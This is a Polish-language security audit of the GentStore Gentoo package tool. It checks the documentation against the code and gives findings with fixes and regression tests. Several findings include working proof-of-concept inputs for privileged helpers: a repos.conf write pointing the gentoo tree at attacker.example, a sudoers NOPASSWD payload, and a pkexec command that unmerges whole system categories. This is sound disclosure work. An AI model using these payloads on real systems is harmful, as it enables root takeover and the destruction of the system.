# Secure code review — GentStore

**Zakres:** pełny (HEAD = `9b6ba1d`, po v1.3.6) · **Data:** 2026-09-20 · **Język raportu:** polski
**Tryb:** tylko odczyt. Żaden plik w repozytorium ani w systemie nie został zmieniony; nic
uprzywilejowanego nie zostało uruchomione. Wszystkie dowody pochodzą ze skryptów, które importują
`gentstore_helper` / `gentstore_launcher` i wołają ich funkcje na katalogu tymczasowym, tak jak
robi to `tests/test_helper.py`.

> **Stan po przeglądzie.** Raport opisuje kod w chwili audytu (`9b6ba1d`). **wszystkie znaleziska, GS-01 do GS-18, zostały od tego czasu rozstrzygnięte** na gałęzi `fix/helper-content-validation`; szczegóły
> w [POPRAWKI.md](POPRAWKI.md) i w `CHANGELOG.md`. Pozostałe znaleziska stoją niezmienione.

---

## 1. Podsumowanie

Projekt jest napisany z realnym modelem zagrożeń w głowie i to widać: granica zaufania jest
postawiona tam, gdzie powinna (stdin i argv dwóch programów uprzywilejowanych), a nie tam, gdzie
wygodnie. Trzy decyzje są wyraźnie lepsze od średniej w tej klasie narzędzi. Po pierwsze,
`LINE_EDITABLE` i `OWNED_SUBTREES` to listy tego, co aplikacja pisze, a nie listy tego, co wygląda
groźnie — `bashrc`, `package.env`, `env/` i `postsync.d` są odrzucane przez nieobecność, co
obejmuje też przypadki, których nikt jeszcze nie wymyślił. Po drugie, `EMERGE_COMMANDS` to tabela
całych poleceń, a nie zbiór dozwolonych opcji, i każdy wiersz wymusza `--ignore-default-opts` —
to zamyka klasę ataku przez `EMERGE_DEFAULT_OPTS`, którą większość podobnych nakładek ma otwartą.
Po trzecie, `auth_admin` zamiast `auth_admin_keep` jest świadomym kosztem poniesionym po właściwej
stronie.

Najpoważniejsze ryzyko leży w dwóch miejscach, gdzie walidacja sprawdza **ścieżkę, ale nie treść**.
`write_file` wpuszcza dowolny tekst do `/etc/portage/repos.conf/<cokolwiek>.conf`, a plik w tym
katalogu może przedefiniować `sync-uri` repozytorium `gentoo` — czyli jedna zgoda na „zmianę
plików w /etc/portage" kupuje podmianę źródła całego drzewa ebuildów, a więc kod jako root przy
najbliższej aktualizacji (GS-01). `cfg_apply` z `decision="merge"` przyjmuje dowolną treść i nie
wymaga pola `expect`, więc obok każdego pliku `._cfgNNNN_` pozostawionego przez Portage można
zapisać, co się chce, jako root (GS-02). Obie ścieżki są osiągalne dla dowolnego procesu
działającego jako ten sam użytkownik, za jednym dialogiem, którego treść tego nie zapowiada.

Poza tym: `_only_root_can_write` jest opisany w kodzie jako zabezpieczenie katalogu, w którym leży
plik `._cfg`, a faktycznie nikt go o ten katalog nie pyta (GS-03); wzorzec `match` w `replace_line`
to nadal regex z żądania, kompilowany i uruchamiany w procesie roota (GS-05, PoC z pomiarami);
`FEATURES` mieści w dozwolonym zestawie znaków wyłączenie sandboksa i `userpriv` (GS-06);
`emerge --unmerge sys-apps/*` przechodzi przez tabelę, choć `*/*` ma własną barierę (GS-04).

Osobna, nietrywialna rodzina błędów dotyczy naczelnej zasady projektu — „podgląd = zapis".
W całym `gentstore/ui/` **ani razu** nie pada `setTextFormat(PlainText)`, a `QLabel` domyślnie
pracuje w `Qt::AutoText`. Skutek nie wymaga napastnika: atom z operatorem `<` (na przykład
`<sys-apps/foo-2 ~amd64`, linia, którą `emerge --autounmask` potrafi wypisać) wyświetla się
w oknie „Zostanie zapisane" jako **pusty ciąg**, a do `/etc/portage` trafia w całości (GS-07).
Z napastnikiem B ta sama luka daje `<img src="http://…">` w opisie pakietu, czyli ruch sieciowy
z aplikacji, o której dokumentacja mówi „it does not send data anywhere" (GS-08).

Dokumentacja jest wyjątkowo szczegółowa i w większości zgodna z kodem; rozbieżności, które
znalazłem, są wypunktowane w tabeli w §2 i zawsze jako osobne znalezisko.

---

## 2. Tabela zgodności dokument ↔ kod

Reguły z `Docs/04-privileges.md`. Status: **potwierdzona** / **częściowo** / **niepotwierdzona** /
**sprzeczna z kodem**.

### §2 — helper

| Reguła | Status | Plik:linia | Uwaga |
|---|---|---|---|
| 1 — po `realpath()` cel wewnątrz `/etc/portage` albo plik `._cfg` w katalogu chronionym | potwierdzona | `gentstore_helper.py:335-373` | Rozwiązanie przed sprawdzeniem, rodzic też sprawdzany, `is_symlink()` na ostatnim komponencie. Zapis idzie przez `os.replace`, które nie podąża za dowiązaniem ostatniego komponentu — okna TOCTOU nie znalazłem. |
| 1a — które pliki dla `append/replace/remove_line`, `write_file`, `delete_file` | **częściowo** | `:440-471`, `:543-555` | Lista i głębokość dla linii są egzekwowane poprawnie (głębokość liczona po rozwiązaniu, `relative_to(_root())`). Dla `write_file`/`delete_file` sprawdzany jest **tylko** `relative.parts[0]`: brak limitu głębokości i **brak jakiejkolwiek walidacji treści** → GS-01. |
| 1b — dla `make.conf` liczy się też **która linia** | **częściowo** | `:493-540`, `:150` | Mechanika bez zarzutu: NUL odrzucony, dziewięć nazw, zbalansowane cudzysłowy, sprawdzana linia **wchodząca**, osobno od wzorca. Ale zbiór znaków `[A-Za-z0-9 _+=@,./:~*-]` przepuszcza `FEATURES="-sandbox -userpriv"` i `MAKEOPTS="-j1 -f/ścieżka"` → GS-06. |
| 1c — `append_lines` węższe, wszystko sprawdzane przed pierwszym zapisem | potwierdzona | `:778-878` | Dwie fazy rzeczywiście rozdzielone, `BATCH_MAX` egzekwowany przed pracą, `_require_batch_target` woła `_require_line_target` (podzbiór, nie druga kopia). Duplikaty ścieżki w partii działają tak, jak opisano. |
| 1d — jeden katalog i tylko jeden | potwierdzona | `:386-437` | Dokładnie dwa komponenty, nazwa z `LINE_DIRECTORIES`, `is_symlink() or exists()` przed `mkdir`, `chmod 0755` po (umask nie decyduje). `make.conf` wykluczony po nazwie. |
| 2 — odmowa podążania za dowiązaniami wyprowadzającymi poza obszar | potwierdzona | `:367-368` | Test negatywny istnieje (`test_a_symlink_pointing_out_of_the_root_is_refused`). |
| 3 — zapis atomowy | potwierdzona | `:572-600` | `mkstemp` w tym samym katalogu, `fsync` pliku i katalogu, sprzątanie w `except BaseException`. |
| 4 — właściciel i uprawnienia zachowane, nowe pliki 0644 root:root | potwierdzona | `:563-589` | `_preserve` + `chown` tylko gdy euid 0. |
| 5 — kopia przed pierwszą zmianą w sesji | potwierdzona | `:1119-1126` | `ensure_backup` w tym samym wywołaniu uprzywilejowanym. |
| 6 — odpowiedź zawiera dokładną ścieżkę i treść | **częściowo** | `:1130-1136` | Helper odsyła prawdę; GUI **pokazuje** ją przez `QLabel` w trybie `AutoText`, więc to, co widać, potrafi się różnić od tego, co odesłano → GS-07. Pole `path` w odpowiedzi jest echem żądania (`request.get("path")`), nie ścieżką rozwiązaną. |
| 7 — `write_file`/`delete_file` wymagają `expect`; `cfg_apply` honoruje, gdy dostanie | **sprzeczna z kodem co do skutku** | `:1089-1109`, `:1006-1007` | Opis jest prawdziwy co do litery, ale dla `decision="merge"` opcjonalność `expect` znaczy: dowolna treść, bez sprawdzenia stanu celu → GS-02. |
| 8 — `/etc/portage` to stała w kodzie | potwierdzona | `:61` | Nie argument, nie zmienna środowiskowa. |
| 9 — `cfg_apply` jedyna operacja poza `/etc/portage`, ograniczona trzema warunkami | **częściowo** | `:974-1018`, `:244-275` | Trzy warunki z dokumentu są egzekwowane. Czwarty, który obiecuje docstring `_only_root_can_write` („the directory has to be one only root can write to"), **nie jest sprawdzany** dla katalogu kandydata → GS-03. Parser `CONFIG_PROTECT` jest tak prymitywny, jak obiecano (`:278-294`). |

### §2a — launcher

| Punkt | Status | Plik:linia | Uwaga |
|---|---|---|---|
| Zamknięta lista programów, szukana poza `PATH` | potwierdzona | `gentstore_launcher.py:76-105` | `SEARCH_PATH` stałe, `"/" in program` odrzucone. Brak sprawdzenia właściciela katalogu — w praktyce root, ale nie jest to sprawdzane. |
| `emerge` — tabela całych poleceń, opcje porównywane dosłownie | **częściowo** | `:282-374` | Tabela i `_matches` działają poprawnie (opcjonalne tokeny nie mogą się powtórzyć ani zamienić kolejnością — sprawdzone). Ale „atom" dopuszcza `kategoria/*`, więc `--unmerge sys-apps/*` przechodzi → GS-04. |
| Nazwy kończące się `.ebuild/.tbz2/.gpkg/.xpak` odrzucone | potwierdzona | `:137`, `:200` | `.gpkg.tar` też objęte. Dopasowanie jest wrażliwe na wielkość liter — `emerge` traktuje plik po zawartości, nie po sufiksie, więc to bariera pomocnicza, nie szczelna. |
| Każdy wiersz wymaga `--ignore-default-opts` | potwierdzona | `:265`, `:282-340` | Test `test_every_emerge_command_ignores_the_users_default_options` to pokrywa. |
| Zbiór z literałem tylko w dwóch wierszach | potwierdzona | `:191-202`, `:321`, `:339` | `@world`/`@preserved-rebuild` jako literały; `_is_package_atom` odrzuca `@…`. |
| `emaint sync` czyta `EMERGE_DEFAULT_OPTS` — wpływa na „jak", nie na „co" | potwierdzona | — | Zweryfikowałem argument: `--root` jest obsługiwany w `_emerge.main`, a nie na ścieżce `emaint`; akcja `sync` jest ustalona przed parsowaniem. Zgodnie z §7 promptu nie raportuję tego jako nowego. |
| `eselect` — tabela całych szablonów | **częściowo** | `:237-248`, `:157` | Szablon jest, ale `_URI` po schemacie przepuszcza `[^\s]+`, w tym `file://` na katalog użytkownika, a `_REPOSITORY` nie wyklucza nazwy `gentoo` → GS-09. |
| `glsa-check` — `-l`/`-f` i tylko numery GLSA lub `affected` | potwierdzona | `:385-393` | Walidacja argumentów szczelna. Brak potwierdzenia po stronie GUI dla `-f` → GS-11. |
| `dispatch-conf`/`etc-update` usunięte z listy | potwierdzona | `:76` | |
| Dziecko dostaje `/dev/null` na stdin | potwierdzona | `:491` | |
| `PYTHONUNBUFFERED=1`, czyste środowisko | potwierdzona | `:413-432` | Do `Popen` trafia **tylko** ten słownik (`env=`), `LOCPATH` nie jest przekazywany. `LC_ALL` przepisany z otoczenia wywołującego — wartość kontrolowana przez napastnika, ale bez `LOCPATH` glibc czyta tylko `/usr/lib/locale`; nie znalazłem tu skutku. |
| Obie połowy wersjonowane razem, `installed_status()` | potwierdzona | `privilege.py:360-391` | Porównanie bez linii `#!`, memo unieważniane przez `_stamp`. Zainstalowana kopia **nowsza/obca** jest raportowana tak samo jak starsza („stale") — komunikat mówi „from an older version", co w tym przypadku jest nieprawdą, ale nic z tego nie wynika. |

### §3 — polkit

| Punkt | Status | Plik:linia | Uwaga |
|---|---|---|---|
| Dwie akcje, `auth_admin` (nie `_keep`) | potwierdzona | `org.gentoo.gentstore.policy:42-44,56-58` | |
| `exec.path` wiąże akcję z programem | potwierdzona | `:46`, `:61` | Brak `exec.argv1` — zgodne z opisem (polkit wiąże ścieżkę, nie argumenty). |
| Komunikat `modify-config` wymienia `/etc` obok `/etc/portage` | potwierdzona | `:38-39` | Uczciwie co do *miejsca*. Nie co do *treści*: nie zapowiada „dowolna treść, jaką poda wołający" → GS-02. |
| Komunikat `run-emerge`: „install, update or remove packages" | **częściowo** | `:53-54` | Za tą akcją stoi też `eselect repository add` (dodanie źródła oprogramowania) i `eselect profile set` (zmiana profilu systemu). Dokument sam to przyznaje w §3 („A third action would be better still") — raportuję tylko to, czego przyznanie nie obejmuje → GS-09. |
| `allow_inactive` | **niepotwierdzona w dokumencie** | `:43`, `:57` | Dokument nie wspomina o sesjach nieaktywnych/zdalnych → GS-14. |
| Kopie z drzewa źródłowego nie sięgają roota same z siebie | potwierdzona | `privilege.py:271-299` | `GENTSTORE_DEV_HELPER` domyślnie wyłączony, ostrzeżenie w logu. Ale `_tampering_risk` nie sprawdza właściciela → GS-15 (Info; dokument sam opisuje to ryzyko). |
| Jedna maszyna albo żadna (`ROOT`/`PORTAGE_CONFIGROOT`/`SYSROOT`/`EPREFIX`) | potwierdzona | `privilege.py:72-110,171-176` | Sprawdzane przed przypadkiem „już root", obie ścieżki uprzywilejowane przechodzą przez `detect()`. Normalizacja `//`, `""`, `EPREFIX` obsłużona. |

### §5 — kopie zapasowe

| Punkt | Status | Plik:linia | Uwaga |
|---|---|---|---|
| Kopia przed pierwszą zmianą, w tym samym wywołaniu | potwierdzona | `gentstore_helper.py:1119-1126` | |
| Sufiks `-1`, `-2` przy kolizji w tej samej minucie | potwierdzona | `:672-681` | |
| `keep` między 1 a 100, egzekwowane w helperze | potwierdzona | `:670` | `max(MIN, min(MAX, …))` po stronie roota, nie GUI. |
| `restore` przyjmuje tylko nazwę pasującą do wzorca, z `/etc` | potwierdzona | `:697-704` | Regexy zakotwiczone, bez ukośników; `tarfile.extractall(filter="data")` odrzuca ścieżki absolutne, dowiązania poza drzewo i pliki urządzeń. |
| Wariant `.tar.gz` też trafia do `/etc` | potwierdzona | `:676` | |
| `_prune` / `rmtree` a dowiązania | potwierdzona | `:644-656` | `shutil.rmtree` odmawia na dowiązaniu i wyjątek jest połykany; `/etc` i tak zapisywalne tylko dla roota. |

### §7 — przerywanie

| Punkt | Status | Plik:linia | Uwaga |
|---|---|---|---|
| SIGINT → SIGTERM po 10 s, nigdy SIGKILL | potwierdzona | `gentstore_launcher.py:464-483`, `runner/command.py:373-407` | Obie połowy zgodne. |
| EOF = abort | potwierdzona | `gentstore_launcher.py:442-461` | |
| Własna sesja procesu | potwierdzona | `:495`, `runner/command.py:351-353` | |
| Potomek nie przeżyje launchera | **częściowo** | `:497-499` | Przy zwykłym zamknięciu tak (EOF). Jeśli launcher zostanie ubity SIGKILL-em, wątek nigdy nie przetworzy EOF-u i `emerge` zostaje sierotą działającą jako root. Bez skutku dla bezpieczeństwa; odnotowane, bo dokument obiecuje inaczej. |

---

## 3. Znaleziska

Posortowane malejąco wg wagi.

---

### GS-01 · `write_file` sprawdza ścieżkę, ale nie treść — plik w `repos.conf` może przedefiniować `sync-uri` repozytorium `gentoo`

**Waga: Wysoka**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/helper/gentstore_helper.py:944-950` (`op_write_file`), `:543-555` (`_require_owned`), `:165` (`OWNED_SUBTREES`)
**Napastnik i warunki wstępne:** A — dowolny proces działający jako ten sam użytkownik. Wymaga jednego zatwierdzenia dialogu `modify-config` („Zmiana plików w /etc/portage…") i tego, żeby użytkownik kiedykolwiek później zsynchronizował drzewo i cokolwiek zainstalował — czyli normalnego życia systemu Gentoo.

**Scenariusz:**
1. Napastnik woła `pkexec /usr/libexec/gentstore/gentstore-helper` i podaje na stdin:
   `{"op":"write_file","path":"/etc/portage/repos.conf/zzz.conf","content":"[gentoo]\nlocation = /var/db/repos/gentoo\nsync-type = git\nsync-uri = https://attacker.example/tree.git\nauto-sync = yes\n","expect":null}`
2. Użytkownik widzi dialog polkit „Zmiana plików w /etc/portage oraz zatwierdzanie plików konfiguracyjnych…" i wpisuje hasło. Treść pliku nie pojawia się nigdzie — dialog polkit nie pokazuje stdin.
3. `check_path` przepuszcza (ścieżka w `/etc/portage`), `_require_owned` przepuszcza (`relative.parts[0] == "repos.conf"`), `_check_expectation` przepuszcza (`expect: null`, pliku jeszcze nie ma). Treść nie jest sprawdzana w ogóle.
4. Portage czyta wszystkie pliki w `repos.conf/` w kolejności nazw i scala je; sekcja `[gentoo]` z pliku czytanego później nadpisuje wcześniejszą definicję.
5. Najbliższy `emaint sync` pobiera drzewo ebuildów z serwera napastnika. Najbliższy `emerge` czegokolwiek wykonuje `pkg_setup`/`pkg_preinst`/`pkg_postinst` **jako root**.

**Dowód** (PoC na katalogu tymczasowym, `CONFIG_ROOT` podmieniony po imporcie):

```
=== write_file: tylko sciezka jest sprawdzana, nie tresc ===
   ok -> 174
  na dysku: '[DEFAULT]\nsync-uri = https://attacker.example/tree.git\n\n[gen' ...

=== czy pozniejszy plik nadpisuje? (configparser, tak jak RepoConfigLoader) ===
  sync-uri po scaleniu: https://attacker.example/tree.git
```

Kod, który podejmuje decyzję:

```python
def op_write_file(request: dict[str, Any]) -> dict[str, Any]:
    path = check_path(_string(request, "path"))
    _require_owned(path)
    content = _string(request, "content")     # <- nic nie pyta, co to jest
    _check_expectation(path, request)
    atomic_write(path, content)
```

**Skutek:** wykonanie dowolnego kodu jako root, z opóźnieniem do najbliższej aktualizacji, po jednym dialogu, którego treść mówi o „zmianie plików konfiguracyjnych", a nie o podmianie źródła całego oprogramowania w systemie. Dodatkowo: `_require_owned` patrzy tylko na `parts[0]`, więc nie ma żadnego limitu głębokości dla tej operacji (w przeciwieństwie do `LINE_EDITABLE_DEPTH`).

**Poprawka** (minimalna — walidacja treści po stronie helpera, bo to ta strona odpowiada na pytanie):

```diff
@@ gentstore/helper/gentstore_helper.py
+#: Klucze, które sekcja repozytorium pisana przez Gentstore może ustawić.
+_REPO_KEYS = frozenset({
+    "location", "sync-type", "sync-uri", "auto-sync", "priority", "masters",
+})
+
+def _check_repo_file(path: Path, content: str) -> None:
+    """`repos.conf` to nie worek na tekst: sekcja czytana później nadpisuje
+    wcześniejszą, więc dowolna treść tutaj to prawo do przedefiniowania
+    dowolnego repozytorium — łącznie z `gentoo`."""
+    import configparser  # noqa: PLC0415
+    parser = configparser.ConfigParser()
+    try:
+        parser.read_string(content)
+    except configparser.Error as exc:
+        raise HelperError("bad_repo_file", f"nie jest to plik repos.conf: {exc}") from exc
+    if parser.defaults():
+        raise HelperError("bad_repo_file", "sekcja [DEFAULT] dotyczy wszystkich repozytoriów")
+    expected = path.stem
+    if list(parser.sections()) != [expected]:
+        raise HelperError(
+            "bad_repo_file",
+            f"{path.name} może definiować wyłącznie sekcję [{expected}]",
+        )
+    for key, value in parser[expected].items():
+        if key not in _REPO_KEYS:
+            raise HelperError("bad_repo_file", f"{key} nie jest kluczem, który Gentstore pisze")
+        if key == "location" and not value.startswith("/var/db/repos/"):
+            raise HelperError("bad_repo_file", "location musi leżeć w /var/db/repos")
+
 def op_write_file(request: dict[str, Any]) -> dict[str, Any]:
     path = check_path(_string(request, "path"))
     _require_owned(path)
     content = _string(request, "content")
+    _check_repo_file(path, content)
     _check_expectation(path, request)
```

Dodatkowo w `_require_owned` dołożyć limit głębokości (`len(relative.parts) > 2 → odmowa`),
bo dziś `write_file` sięga dowolnie głęboko pod `repos.conf/`.

**Test regresyjny** — `tests/test_helper.py`:

```python
def test_write_file_refuses_a_repository_file_that_redefines_another_repo(portage):
    """Plik w repos.conf czytany później nadpisuje sekcję czytaną wcześniej."""
    answer = call(
        "write_file",
        path=str(portage / "repos.conf" / "zzz.conf"),
        content="[gentoo]\nsync-uri = https://attacker.example/tree.git\n",
        expect=None,
    )
    assert answer["code"] == "bad_repo_file"
    assert not (portage / "repos.conf" / "zzz.conf").exists()


def test_write_file_refuses_a_default_section(portage):
    answer = call("write_file", path=str(portage / "repos.conf" / "a.conf"),
                  content="[DEFAULT]\nsync-uri = https://attacker.example/\n", expect=None)
    assert answer["code"] == "bad_repo_file"
```

---

### GS-02 · `cfg_apply` z `decision="merge"` zapisuje dowolną treść i nie wymaga `expect`

**Waga: Wysoka**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/helper/gentstore_helper.py:974-1018` (`op_cfg_apply`), `:1089-1109` (`_check_expectation`)
**Napastnik i warunki wstępne:** A. Wymaga jednego zatwierdzenia `modify-config` i tego, żeby gdziekolwiek pod katalogiem chronionym leżał plik `._cfgNNNN_X` — czyli normalnego stanu systemu Gentoo po aktualizacji (to jest dokładnie ten stan, dla którego istnieje ekran „Pliki konfiguracyjne").

**Scenariusz:**
1. Po aktualizacji `app-admin/sudo` w systemie leży `/etc/._cfg0000_sudoers` (albo `/etc/ssh/._cfg0000_sshd_config`, albo dowolny inny — wystarczy jeden).
2. Napastnik woła helper z `{"op":"cfg_apply","path":"/etc/._cfg0000_sudoers","decision":"merge","content":"<dowolna treść>"}`.
3. `check_path` przepuszcza (`/etc` jest katalogiem chronionym), `_CFG_PREFIX` pasuje, `decision` jest na liście. Cel jest wyprowadzony z nazwy — poprawnie. Ale:
   ```python
   content = _string(request, "content") if decision == "merge" else _read(candidate)
   if "expect" in request:                 # <- opcjonalne
       _check_expectation(target, request)
   archived = _archive(target) if target.exists() else None
   atomic_write(target, content)           # <- treść z żądania, do pliku w /etc
   ```
4. `/etc/sudoers` ma treść wybraną przez napastnika. `candidate.unlink()` sprząta ślad.

**Dowód:** PoC w `security-review/poc/poc_cfg.py` — `victim.conf` po wywołaniu zawiera
`'# content chosen by the caller, written as root\n'`, plik `._cfg0000_victim.conf` znika,
odpowiedź `ok: true`.

**Skutek:** zapis dowolnej treści jako root do pliku wskazanego pośrednio (przez istnienie pliku
`._cfg` obok). Przy `/etc/sudoers` lub `/etc/sudoers.d/*` to natychmiastowy root; przy
`/etc/pam.d/*` lub `/etc/ssh/sshd_config` — to samo z jednym krokiem więcej. Dialog polkit
zapowiada „zatwierdzanie plików konfiguracyjnych pozostawionych przez aktualizację", co użytkownik
czyta jako „przyjmij wersję, którą przyniósł pakiet", a nie „wpisz tam, co podał wołający".

**Poprawka:** `merge` istnieje dla tekstu, który użytkownik zobaczył w edytorze różnic, więc
„widziałem stan celu" jest dokładnie tym, co ta operacja może obiecać:

```diff
@@ def op_cfg_apply
     content = _string(request, "content") if decision == "merge" else _read(candidate)
 
-    if "expect" in request:
+    if decision == "merge":
+        # Scalona treść jest wymyślona przez wołającego, więc jedyne, co ją wiąże
+        # z tym, co zobaczył użytkownik, to stan celu w chwili oglądania różnicy.
+        _check_expectation(target, request)
+    elif "expect" in request:
         _check_expectation(target, request)
```

oraz (osobno, i to jest część mocniejsza) ograniczenie `merge` do celów, których treść dało się
przed chwilą policzyć — albo rezygnacja z wolnej treści na rzecz listy wybranych fragmentów
(hunków) z pliku `._cfg`. Wariant minimalny, który domyka klasę: pozwolić na `merge` tylko wtedy,
gdy wynikowa treść jest podzbiorem linii `candidate` ∪ linii `target`.

**Test regresyjny:**

```python
def test_cfg_apply_merge_requires_an_expectation(portage, tmp_path):
    """Scalona treść jest wymyślona przez wołającego — bez `expect` nic jej nie wiąże
    z tym, co zobaczył użytkownik."""
    target = tmp_path / "etc" / "sudoers"
    target.write_text("root ALL=(ALL) ALL\n", encoding="utf-8")
    (tmp_path / "etc" / "._cfg0000_sudoers").write_text("x\n", encoding="utf-8")

    answer = call("cfg_apply", path=str(tmp_path / "etc" / "._cfg0000_sudoers"),
                  decision="merge", content="attacker ALL=(ALL) NOPASSWD: ALL\n")

    assert answer["ok"] is False
    assert answer["code"] == "bad_request"
    assert target.read_text(encoding="utf-8") == "root ALL=(ALL) ALL\n"
```

---

### GS-03 · Katalog, w którym leży plik `._cfg`, nigdy nie jest pytany o to, kto może w nim pisać

**Waga: Średnia**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/helper/gentstore_helper.py:244-275` (`_only_root_can_write`), `:297-332` (`protected_roots`), `:982-984`
**Napastnik i warunki wstępne:** C — inny lokalny użytkownik bez uprawnień (albo A). Wymaga, żeby pod katalogiem chronionym istniał katalog, którego nie posiada wyłącznie root lub który jest zapisywalny dla grupy/innych.

**Scenariusz:**
1. `protected_roots()` pyta `_only_root_can_write` o **wartość z `CONFIG_PROTECT`** — czyli o `/etc`. `/etc` jest `root:root 0755`, więc odpowiedź brzmi „tak" i `/etc` trafia na listę.
2. `op_cfg_apply` woła `check_path(..., roots=protected_roots())`, które sprawdza wyłącznie, czy ścieżka **leży wewnątrz** któregoś z tych katalogów. O katalogu `/etc/<coś>`, w którym faktycznie leży plik `._cfg`, nikt już nie pyta.
3. Napastnik C zakłada `/etc/<katalog-zapisywalny>/._cfg0000_target` i czeka, aż użytkownik zatwierdzi cokolwiek na ekranie „Pliki konfiguracyjne" — albo napastnik A robi to sam.

**Dowód** (PoC `security-review/poc/poc_cfg.py`; `_only_root_can_write` przepisany tą samą regułą,
tylko z zatrzymaniem na korzeniu piaskownicy zamiast na `/`, i z użytkownikiem uruchamiającym
w roli roota — czyli reguła jest tu tak samo surowa jak w produkcji):

```
is /etc a protected root?       ['/tmp/…/etc']
would the rule allow etc/loose? False      <- reguła by odmówiła
answer: True                               <- ale nikt jej nie zapytał
victim.conf now: '# content chosen by the caller, written as root\n'
```

**Sprzeczność dokument ↔ kod.** Docstring `_only_root_can_write` mówi wprost:

> „What matters is whether an unprivileged user could have planted the `._cfgNNNN_` file that
> lands there, and that is a question about ownership."

a docstring `protected_roots` powtarza:

> „and the directory has to be one only root can write to — see `_only_root_can_write`."

Kod sprawdza to o jeden poziom za wysoko. Test `test_config_protect_cannot_be_pointed_at_a_directory_others_can_write`
(`tests/test_helper.py:1144`) sprawdza dokładnie ten, działający przypadek — korzeń — i dlatego
przechodzi.

**Skutek:** zapis jako root do pliku obok podstawionego `._cfg`, w dowolnym katalogu pod `/etc`,
którego nie posiada wyłącznie root. Na czystym Gentoo takich katalogów jest mało, dlatego waga jest
Średnia, a nie Wysoka — ale dokładnie o tej klasie mówi komentarz w kodzie i jej nie zamyka.

**Poprawka:**

```diff
@@ def op_cfg_apply
     candidate = check_path(
         _string(request, "path"), must_exist=True, roots=protected_roots()
     )
     if not _CFG_PREFIX.match(candidate.name):
         raise HelperError("not_a_cfg_file", f"{candidate.name} is not a ._cfgNNNN_ file")
+    # Nie wystarczy, że korzeń CONFIG_PROTECT należy do roota: plik ._cfg leży
+    # w konkretnym katalogu i to ten katalog decyduje, kto mógł go tam położyć.
+    if not _only_root_can_write(candidate.parent):
+        raise HelperError(
+            "unsafe_directory",
+            f"{candidate.parent} is writable by somebody other than root",
+        )
```

**Test regresyjny:**

```python
def test_cfg_apply_refuses_a_directory_others_can_write(portage, tmp_path, monkeypatch):
    """Reguła z _only_root_can_write ma obowiązywać tam, gdzie plik naprawdę leży."""
    loose = tmp_path / "etc" / "loose"
    loose.mkdir()
    loose.chmod(0o777)
    (loose / "victim.conf").write_text("harmless\n", encoding="utf-8")
    (loose / "._cfg0000_victim.conf").write_text("new\n", encoding="utf-8")
    monkeypatch.setattr(helper.os, "geteuid", lambda: 0)
    monkeypatch.setattr(helper, "_only_root_can_write",
                        lambda p: Path(p) != loose)

    answer = call("cfg_apply", path=str(loose / "._cfg0000_victim.conf"), decision="accept")

    assert answer["code"] == "unsafe_directory"
    assert (loose / "victim.conf").read_text(encoding="utf-8") == "harmless\n"
```

---

### GS-04 · `emerge --unmerge <kategoria>/*` przechodzi przez tabelę

**Waga: Wysoka**  **Pewność: potwierdzone (PoC)**
**Miejsce:** `gentstore/helper/gentstore_launcher.py:167-188` (`_is_everything`), `:122-133` (`_ATOM`), `:306` (wiersz `--unmerge`)
**Napastnik i warunki wstępne:** A. Jedno zatwierdzenie dialogu `run-emerge`.

**Scenariusz:**
```
pkexec /usr/libexec/gentstore/gentstore-launcher \
    emerge --ignore-default-opts --color=n --nospinner --unmerge 'sys-libs/*' 'sys-apps/*'
```

**Dowód:**

```
  refused  emerge … --unmerge */*
  ACCEPTED emerge … --unmerge sys-apps/*
  ACCEPTED emerge … --unmerge sys-libs/* sys-apps/* sys-devel/*
  ACCEPTED emerge … --unmerge */portage
```

`_is_everything` ogranicza się do dokładnego zapisu `*/*`:

```python
body = token.lstrip("!<>=~")
body = body.partition("::")[0].partition("[")[0].partition(":")[0]
return body == "*/*"
```

**Skutek:** usunięcie całych kategorii systemowych — `sys-libs/*` zabiera `glibc`, `sys-apps/*`
zabiera `portage`, `coreutils` i `baselayout`. To nie jest „remove packages", to jest ta sama
rzecz, którą `_is_everything` istnieje po to, żeby powstrzymać, tylko zapisana inaczej. Docstring
tej funkcji sam mówi, że `--unmerge` + `*/*` „is the whole system"; `sys-apps/*` jest tym samym.
Interfejs nigdy nie buduje `--unmerge` z dzikiej karty — `emerge.unmerge([cp])` dostaje jeden
konkretny `cat/pkg` (`gentstore/ui/pages/search.py:815`).

**Obalenie, którego próbowałem:** czy dzika karta jest gdzieś potrzebna? Tak, ale tylko
w podglądzie — `test_the_launcher_refuses_every_package_there_is` celowo dopuszcza
`emerge --pretend --verbose media-video/*`. Podgląd nic nie usuwa, więc ograniczenie może dotyczyć
wyłącznie wierszy zmieniających stan.

**Poprawka:**

```diff
@@ gentstore/helper/gentstore_launcher.py
+#: Atom bez dzikiej karty — dla wierszy, które coś usuwają.
+#: `*/*` ma własną barierę, ale `sys-apps/*` jest tą samą rzeczą zapisaną inaczej:
+#: `emerge --unmerge 'sys-libs/*'` zabiera glibc, a dialog mówi „remove packages".
+EXACT_ATOMS = "<exact-atoms>"
+
+def _is_exact_atom(token: str) -> bool:
+    return _is_package_atom(token) and "*" not in token
@@
     # unmerge_pretend()
     (*_EMERGE_BASE, "--pretend", "--verbose", "--unmerge", ATOMS),
     # unmerge()
-    (*_EMERGE_BASE, "--unmerge", ATOMS),
+    (*_EMERGE_BASE, "--unmerge", EXACT_ATOMS),
```

i obsługa `EXACT_ATOMS` w `_matches` obok `ATOMS` (ta sama gałąź, inny predykat).

**Test regresyjny** — `tests/test_runner.py`:

```python
def test_the_launcher_refuses_to_unmerge_a_whole_category():
    """`*/*` ma własną barierę od dawna; `sys-apps/*` to ta sama rzecz inaczej zapisana."""
    for atom in ("sys-apps/*", "sys-libs/*", "*/portage"):
        with pytest.raises(launcher.LauncherError):
            launcher.check_arguments("emerge", [*launcher._EMERGE_BASE, "--unmerge", atom])
    # Podgląd nadal wolno: nic nie usuwa.
    launcher.check_arguments(
        "emerge", [*launcher._EMERGE_BASE, "--pretend", "--verbose", "--unmerge", "sys-apps/*"]
    )
```

---

### GS-05 · Wzorzec `match` w `replace_line` to regex z żądania, uruchamiany w procesie roota

**Waga: Średnia**  **Pewność: potwierdzone (PoC z pomiarami)**
**Miejsce:** `gentstore/helper/gentstore_helper.py:896-907`, `:215` (`PATTERN_MAX`)
**Napastnik i warunki wstępne:** A. Dwa zatwierdzenia `modify-config` (albo jedno, jeśli w pliku i tak jest wystarczająco długa linia).

**Scenariusz:**
